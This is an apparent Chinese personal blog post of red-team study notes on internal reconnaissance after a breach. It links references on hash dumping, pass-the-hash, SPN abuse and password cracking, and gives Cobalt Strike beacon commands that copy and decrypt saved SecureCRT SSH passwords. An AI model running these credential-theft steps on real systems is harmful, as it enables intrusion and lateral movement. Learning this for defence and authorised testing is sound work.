<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/favicon.png"><link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>红队攻防学习之内部信息收集 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/css/gundongtiao.css# 滚动条颜色.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/css/shubiao.css# 鼠标指针.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="红队攻防学习之内部信息收集"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-12-24 03:52" pubdate>2020年12月24日 凌晨</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 6.2k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 86 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">红队攻防学习之内部信息收集</h1><div class="markdown-body"><h1 id="五、内部信息收集"><a href="#五、内部信息收集" class="headerlink" title="五、内部信息收集"></a>五、内部信息收集</h1><h2 id="1、本地信息搜集"><a href="#1、本地信息搜集" class="headerlink" title="1、本地信息搜集"></a>1、本地信息搜集</h2><h3 id="1-1、用普通权限的域帐户获得域环境中所有DNS解析记录"><a href="#1-1、用普通权限的域帐户获得域环境中所有DNS解析记录" class="headerlink" title="1.1、用普通权限的域帐户获得域环境中所有DNS解析记录"></a>1.1、用普通权限的域帐户获得域环境中所有DNS解析记录</h3><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>beta.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/web/</span><span class="hljs-number">17955</span>.html  --原文
https:<span class="hljs-regexp">//</span>nosec.org<span class="hljs-regexp">/home/</span>detail/<span class="hljs-number">2527</span>.html</code></pre><hr><h3 id="1-2、令牌Token和会话Session原理与攻略"><a href="#1-2、令牌Token和会话Session原理与攻略" class="headerlink" title="1.2、令牌Token和会话Session原理与攻略"></a>1.2、令牌Token和会话Session原理与攻略</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/huangsheng/</span>p/<span class="hljs-number">10736796</span>.html</code></pre><h3 id="1-3、内存转储-获取本地hash"><a href="#1-3、内存转储-获取本地hash" class="headerlink" title="1.3、内存转储-获取本地hash"></a>1.3、内存转储-获取本地hash</h3><p>参考文章：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.secwk.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">09</span><span class="hljs-regexp">/08/</span><span class="hljs-number">6372</span>/</code></pre><hr><h3 id="1-4、转储域账户哈希值"><a href="#1-4、转储域账户哈希值" class="headerlink" title="1.4、转储域账户哈希值"></a>1.4、转储域账户哈希值</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>scarletf.github.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">09</span><span class="hljs-regexp">/03/</span>域渗透-导出域用户Hash方法/
https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2527</span>   ---如何Dump域内的Hash
https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1165439</span>   --导出域内用户hash的几种方法</code></pre><p>这几种方法，结合下思想<br>然后书中的两个续集思路…</p><hr><h3 id="1-5、SPN发现与利用"><a href="#1-5、SPN发现与利用" class="headerlink" title="1.5、SPN发现与利用"></a>1.5、SPN发现与利用</h3><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://sec.thief.one/article_content?a_id=<span class="hljs-number">594539</span>e<span class="hljs-number">5</span>b<span class="hljs-number">195</span>b<span class="hljs-number">5</span>fc<span class="hljs-number">38051</span>bf<span class="hljs-number">7</span>fb<span class="hljs-number">438524</span>   --详细文章</code></pre><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>rcoil.me<span class="hljs-regexp">/2019/</span><span class="hljs-number">06</span><span class="hljs-regexp">/【域渗透】SPN%20扫描利用/</span>
https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">174229</span>.html   --老文章  SPN服务主体名称发现详解</code></pre><p>想要继续了解的可以查看这两篇文章，巩固下</p><hr><h3 id="1-6哈希传递攻击利用"><a href="#1-6哈希传递攻击利用" class="headerlink" title="1.6哈希传递攻击利用"></a>1.6哈希传递攻击利用</h3><p>参考文献：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>saucer-man.com<span class="hljs-regexp">/information_security/</span><span class="hljs-number">443</span>.html<span class="hljs-comment">#cl-11</span>
https:<span class="hljs-regexp">//</span>saucer-man.com<span class="hljs-regexp">/information_security/</span><span class="hljs-number">79</span>.html<span class="hljs-comment">#cl-13</span>
https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">217681</span>.html
https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_36119192/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">104802921</span>
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Mikasa-Ackerman/</span>p/hou-shen-tou-zhong-de-mi-ma-zhua-qu.html</code></pre><hr><h2 id="2、用户习惯"><a href="#2、用户习惯" class="headerlink" title="2、用户习惯"></a>2、用户习惯</h2><h3 id="2-1-从目标文件中做信息搜集第一季"><a href="#2-1-从目标文件中做信息搜集第一季" class="headerlink" title="2.1 从目标文件中做信息搜集第一季"></a>2.1 从目标文件中做信息搜集第一季</h3><p>ExifTool可读写及处理图像、视频及音频，例如Exif、IPTC、XMP、JFIF、GeoTIFF、ICC Profile。包括许多相机的制造商信息读取，如佳能，卡西欧，大疆，FLIR，三星等<br><code>exiftool -lang zh-cn -a -u -g1 ./sample.php.png</code></p><p>在大型内网渗透中，尤其是针对办公机的渗透，需要熟知目标集体或者个人的作息时间，工作时间，文档时间，咖啡时间，或者需要从某些文件中获取对方的真实拍摄地坐标等。那么无疑需要快速的从大量文件中筛选信息诉求。当目标越复杂，文件中的信息搜集就更为重要。如文档作者，技术文章作者，财务文档作者等，熟知在大量人员，获取对方职务，大大减少渗透过程中的无用性，重复性，可见性。与暴露性。而作为公司，应该熟悉相关文档的内置属性，尤其是在共享文件服务器上，删除或者复写敏感信息来降低企业安全风险。</p><p>本篇意旨企业安全在处理本公司相关敏感文件以及重要文件应做好更多的防范，尤其是重要部门，如研发，财务等。</p><hr><h3 id="2-2、获取当前系统所有用户的谷歌浏览器密码"><a href="#2-2、获取当前系统所有用户的谷歌浏览器密码" class="headerlink" title="2.2、获取当前系统所有用户的谷歌浏览器密码"></a>2.2、获取当前系统所有用户的谷歌浏览器密码</h3><p>参考文章：</p><ul><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1512066">https://cloud.tencent.com/developer/article/1512066</a></li></ul><hr><h3 id="2-3、adsutil-vbs-获取密码"><a href="#2-3、adsutil-vbs-获取密码" class="headerlink" title="2.3、adsutil.vbs 获取密码"></a>2.3、adsutil.vbs 获取密码</h3><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.<span class="hljs-number">5</span>dmail.net<span class="hljs-regexp">/html/</span><span class="hljs-number">2007</span>-<span class="hljs-number">5</span>-<span class="hljs-number">9</span>/<span class="hljs-number">20075901045</span>.htm
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/94YY/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">05</span><span class="hljs-regexp">/28/</span><span class="hljs-number">2060887</span>.html</code></pre><p>这很老的知识点，当做一种思路吧…</p><hr><h3 id="2-4、解密目标机器保存的rdp凭证"><a href="#2-4、解密目标机器保存的rdp凭证" class="headerlink" title="2.4、解密目标机器保存的rdp凭证"></a>2.4、解密目标机器保存的rdp凭证</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">6</span>c11412947e5    --mimikatz获取
https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/y</span>J4z    ---lsass获取
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/0xdd/</span>p/<span class="hljs-number">11394566</span>.html</code></pre><p>这个方法很简单，看看就记住了…</p><hr><h3 id="2-5、Hashcat-神器详解"><a href="#2-5、Hashcat-神器详解" class="headerlink" title="2.5、Hashcat 神器详解"></a>2.5、Hashcat 神器详解</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4008</span>   --详细
https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/smli_ng/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106111493</span></code></pre><p>这里遇到了就来查…</p><h4 id="字典集合分享"><a href="#字典集合分享" class="headerlink" title="字典集合分享"></a><strong>字典集合分享</strong></h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm 
https:<span class="hljs-regexp">//</span>weakpass.com/download 
http:<span class="hljs-regexp">//</span>ophcrack.sourceforge.net/tables.php 
https:<span class="hljs-regexp">/github.com/</span>fuzzdb-project/fuzzdb 
https:<span class="hljs-regexp">//</span>wiki.skullsecurity.org/passwords<span class="hljs-comment">#Password_dictionaries</span></code></pre><p>战略支援部近期会对网络上的字典进行下载整理汇总,形成较完整的字典表…拿走</p><h4 id="其他暴力破解软件"><a href="#其他暴力破解软件" class="headerlink" title="其他暴力破解软件"></a><strong>其他暴力破解软件</strong></h4><pre><code class="hljs ada">Aircrack-ng-WIFI破解工具 
John The Ripper<span class="hljs-comment">--功能强大的破解工具包 </span>
Medusa<span class="hljs-comment">--在线破解工具 </span>
Ophcrack<span class="hljs-comment">--LM-Hash破解神器 </span>
THC Hydra<span class="hljs-comment">--在线破解工具 </span>
WFUZZ<span class="hljs-comment">--WebFuzz神器</span></code></pre><h4 id="在线解Hash网站"><a href="#在线解Hash网站" class="headerlink" title="在线解Hash网站"></a><strong>在线解Hash网站</strong></h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cmd5.com/ 
https:<span class="hljs-regexp">//</span>crackstation.net/
https:<span class="hljs-regexp">//</span>www.onlinehashcrack.com/ 
tps:<span class="hljs-regexp">/www.objectif-securite.ch/</span>ophcrack.php 
https:<span class="hljs-regexp">//</span>hce.iteknical.com/</code></pre><hr><h3 id="2-6、解密Winscp和SecureCRT客户端中保存的密码hash"><a href="#2-6、解密Winscp和SecureCRT客户端中保存的密码hash" class="headerlink" title="2.6、解密Winscp和SecureCRT客户端中保存的密码hash"></a>2.6、解密Winscp和SecureCRT客户端中保存的密码hash</h3><h4 id="Winscp"><a href="#Winscp" class="headerlink" title="Winscp"></a>Winscp</h4><p>到时候补充吧</p><h4 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h4><p><strong>前言</strong></p><p>SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。</p><p>所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用结尾处的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了<br><strong>确定目标SecureCRT的详细版本</strong></p><p>想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）</p><pre><code class="hljs gradle">beacon&gt; powershell-<span class="hljs-keyword">import</span> <span class="hljs-regexp">/Users/</span>anonysec/ListInstalledPrograms.ps1
beacon&gt; powershell Get-list</code></pre><p><strong>确定SecureCRT配置文件目录下的Sessions目录</strong></p><p>默认情况下，SecureCRT的Config目录路径为：%APPDATA%\VanDyke\Config\Sessions\</p><p>如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认<br>Sessions目录下的每个ini文件都会以连接的IP或域名来命名</p><pre><code class="hljs taggerscript">beacon&gt;shell dir <span class="hljs-variable">%APPDATA%</span><span class="hljs-symbol">\V</span>anDyke<span class="hljs-symbol">\C</span>onfig<span class="hljs-symbol">\S</span>essions\</code></pre><p><strong>拷贝下载Sessions目录的ini文件</strong></p><p>直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。</p><pre><code class="hljs taggerscript">beacon&gt; powershell-import /Users/anonysec/Invoke-NinjaCopy.ps1
beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\r</span>00t<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\V</span>anDyke<span class="hljs-symbol">\C</span>onfig<span class="hljs-symbol">\S</span>essions<span class="hljs-symbol">\1</span>92.168.144.128.ini&quot; -LocalDestination &quot;c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini&quot;
beacon&gt; shell dir c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini 
beacon&gt; download c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini</code></pre><p><strong>脚本解密Session</strong></p><p>将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！</p><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> pip<span class="hljs-number">2</span> install pycrypto</code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">SecureCRT-decryptpass</span><span class="hljs-selector-class">.py</span> 192.168.144.128<span class="hljs-selector-class">.ini</span></code></pre><p><strong>SecureCRT高版本解决</strong></p><p>如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\VanDyke\Config\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。</p><p>目标SecureCRT版本与本地版本需一致，否则可能会出现问题</p><h4 id="附上脚本"><a href="#附上脚本" class="headerlink" title="附上脚本"></a>附上脚本</h4><p>Winscp:<br><a target="_blank" rel="noopener" href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p><p><a target="_blank" rel="noopener" href="https://bitbucket.org/knarf/winscppwd/downloads/winscppwd.exe">winscppwa.exe</a> –目前无法连接</p><p>SecureCRT：<br><a target="_blank" rel="noopener" href="https://github.com/3gstudent/ListInstalledPrograms/blob/master/ListInstalledPrograms.ps1">ListInstalledPrograms.ps1</a></p><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a></p><p><a target="_blank" rel="noopener" href="https://github.com/gitPoc32/Forensic/blob/5c82582d21811a2257e3f68bd95f5e8735d834cd/VanDykeSecureCRT/SecureCRT-decryptpass.py">SecureCRT-decryptpass.py</a></p><hr><h3 id="2-7、破解Weblogic配置文件中的数据库密码"><a href="#2-7、破解Weblogic配置文件中的数据库密码" class="headerlink" title="2.7、破解Weblogic配置文件中的数据库密码"></a>2.7、破解Weblogic配置文件中的数据库密码</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>web/<span class="hljs-number">220147</span>.html  --这篇集合了很多思路和方法

树上介绍了使用工具WebLogicPWV1.<span class="hljs-number">0</span>.jar进行破解</code></pre><p>这里如果进行config.xml获得hash破解密码，需要去两次密码…</p><hr><h3 id="2-8、获取域控-系统日志"><a href="#2-8、获取域控-系统日志" class="headerlink" title="2.8、获取域控/系统日志"></a>2.8、获取域控/系统日志</h3><h4 id="dumpel"><a href="#dumpel" class="headerlink" title="dumpel"></a>dumpel</h4><h5 id="1、windows系统日志的存储："><a href="#1、windows系统日志的存储：" class="headerlink" title="1、windows系统日志的存储："></a>1、windows系统日志的存储：</h5><p>windows的系统日志存储在C:\WINDOWS\system32\config目录，文件后缀为evt。</p><h5 id="2、导出工具："><a href="#2、导出工具：" class="headerlink" title="2、导出工具："></a>2、导出工具：</h5><p>使用dumpel.exe可以导出windows的系统日志。</p><p>dumpel.exe可以去微软官网下载，地址：<a target="_blank" rel="noopener" href="http://support.microsoft.com/kb/927229%E3%80%82">http://support.microsoft.com/kb/927229。</a></p><p>下载后的dumpel.exe是个安装文件，安装完后可以在安装目录找到一个dumpel.exe，我们需要的是安装后的dumpel.exe。</p><h5 id="3、导出脚本："><a href="#3、导出脚本：" class="headerlink" title="3、导出脚本："></a>3、导出脚本：</h5><p>直接使用dumpel.exe不容易实现自动定期导出系统日志。所以需要编写个脚本。脚本内容：</p><pre><code class="hljs javascript"><span class="hljs-comment">//获得YYYYMMDD格式的当前时间</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCurYYYYMMDD</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">var</span> today = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();
	<span class="hljs-keyword">var</span> year = today.getYear();
	<span class="hljs-keyword">var</span> month = today.getMonth() + <span class="hljs-number">1</span>;
	<span class="hljs-keyword">if</span> (month &lt; <span class="hljs-number">10</span>) &#123;
		month = <span class="hljs-string">&quot;0&quot;</span> + month;
	&#125;
	<span class="hljs-keyword">var</span> date = today.getDay();
	<span class="hljs-keyword">if</span> (date &lt; <span class="hljs-number">10</span>)
	&#123;
		date = <span class="hljs-string">&quot;0&quot;</span> + date;
	&#125;
	<span class="hljs-keyword">return</span> year + <span class="hljs-string">&quot;&quot;</span> + month + <span class="hljs-string">&quot;&quot;</span> + date;
&#125;
<span class="hljs-comment">//补齐目录结尾的&#x27;\&#x27;</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeDir</span>(<span class="hljs-params">str</span>)</span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span> (str.charAt(str.length - <span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;\\&#x27;</span>)
	&#123;
		<span class="hljs-keyword">return</span> str + <span class="hljs-string">&quot;\\&quot;</span>;
	&#125;
	<span class="hljs-keyword">else</span>
	&#123;
		<span class="hljs-keyword">return</span> str;
	&#125;
&#125;
 
<span class="hljs-comment">//处理命令行参数</span>
<span class="hljs-keyword">var</span> args = WScript.Arguments;
<span class="hljs-keyword">var</span> days = <span class="hljs-number">1</span>;
<span class="hljs-keyword">var</span> path = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-keyword">var</span> exepath = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; args.length; i++)
&#123;
	<span class="hljs-keyword">var</span> a = args(i);
	<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-e&quot;</span>) == <span class="hljs-number">0</span>)
	&#123;
		exepath = a.substring(<span class="hljs-number">2</span>, a.length);
	&#125;
	<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-p&quot;</span>) == <span class="hljs-number">0</span>)
	&#123;
		path = a.substring(<span class="hljs-number">2</span>, a.length);
	&#125;
	<span class="hljs-keyword">if</span> (a.indexOf(<span class="hljs-string">&quot;-d&quot;</span>) == <span class="hljs-number">0</span>)
	&#123;
		days = a.substring(<span class="hljs-number">2</span>, a.length);
	&#125;
&#125;
 
<span class="hljs-comment">//补齐目录结尾的&#x27;\&#x27;</span>
exepath = makeDir(exepath);
path = makeDir(path);
 
<span class="hljs-comment">//获取当前时间</span>
<span class="hljs-keyword">var</span> YYYYMMDD = getCurYYYYMMDD();
<span class="hljs-keyword">var</span> YYYYMM = YYYYMMDD.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);
 
<span class="hljs-comment">//判断按月存放的目录是否存在</span>
<span class="hljs-keyword">var</span> fso = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>);
<span class="hljs-keyword">if</span> (fso.FolderExists(path + YYYYMM) != <span class="hljs-literal">true</span>)
&#123;
	fso.CreateFolder(path + YYYYMM);
&#125;
 
<span class="hljs-comment">//执行程序，导出日志</span>
<span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.shell&quot;</span>);
ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; application&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_app.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; security&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_sec.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
ws.run(exepath + <span class="hljs-string">&quot;dumpel.exe /l&quot;</span> + <span class="hljs-string">&quot; system&quot;</span> + <span class="hljs-string">&quot; /f &quot;</span> + path + YYYYMM + <span class="hljs-string">&quot;\\&quot;</span> + YYYYMMDD + <span class="hljs-string">&quot;_sys.xls /d &quot;</span> + days, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);</code></pre><h5 id="4、执行命令："><a href="#4、执行命令：" class="headerlink" title="4、执行命令："></a>4、执行命令：</h5><p>cscript bak_win_log.js -eD:\Desktop -pD:\winlog -d7</p><p>使用windows的任务计划执行该命令就实现了定期导出。</p><p>dumpel的安装目录里的dumpel_d.htm是使用说明</p><hr><h4 id="wevtutil"><a href="#wevtutil" class="headerlink" title="wevtutil"></a>wevtutil</h4><p>直接上看微软详情吧：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>windows-server<span class="hljs-regexp">/administration/</span>windows-commands/wevtutil</code></pre><h4 id="psloglist"><a href="#psloglist" class="headerlink" title="psloglist"></a>psloglist</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/-zhong/</span>p/<span class="hljs-number">11743489</span>.html
https:<span class="hljs-regexp">//</span>wenku.baidu.com<span class="hljs-regexp">/view/</span>c2e9139803d8ce2f006623ff.html?from=search   --最详细的解释</code></pre><h2 id="3、网络信息收集"><a href="#3、网络信息收集" class="headerlink" title="3、网络信息收集"></a>3、网络信息收集</h2><h3 id="3-1、发现目标WEB程序敏感目录"><a href="#3-1、发现目标WEB程序敏感目录" class="headerlink" title="3.1、发现目标WEB程序敏感目录"></a>3.1、发现目标WEB程序敏感目录</h3><p>就一目录扫描工具，可以使用其他代替。<br>参考文章：</p><p><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/21-30/29-fa-xian-mu-biao-web-cheng-xu-min-gan-mu-lu-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/21-30/29-fa-xian-mu-biao-web-cheng-xu-min-gan-mu-lu-di-yi-ji</a></p><hr><h3 id="3-2、基于SCF做目标内网信息搜集"><a href="#3-2、基于SCF做目标内网信息搜集" class="headerlink" title="3.2、基于SCF做目标内网信息搜集"></a>3.2、基于SCF做目标内网信息搜集</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lshack.cn<span class="hljs-regexp">/642/</span>
https:<span class="hljs-regexp">//gi</span>tlab.com<span class="hljs-regexp">/Tomotoes/</span>Micro8<span class="hljs-regexp">/-/</span>blob<span class="hljs-regexp">/b7c284fdbb53ff8ee60acff92d5ebbf1559dfd92/</span>第一百零一课：基于SCF做目标内网信息搜集第二季.pdf</code></pre><p>感谢Micro8大佬退役最后给出的文章思路…</p><hr><h3 id="3-3、内网漏洞快速检测技巧"><a href="#3-3、内网漏洞快速检测技巧" class="headerlink" title="3.3、内网漏洞快速检测技巧"></a>3.3、内网漏洞快速检测技巧</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2354</span>   --good
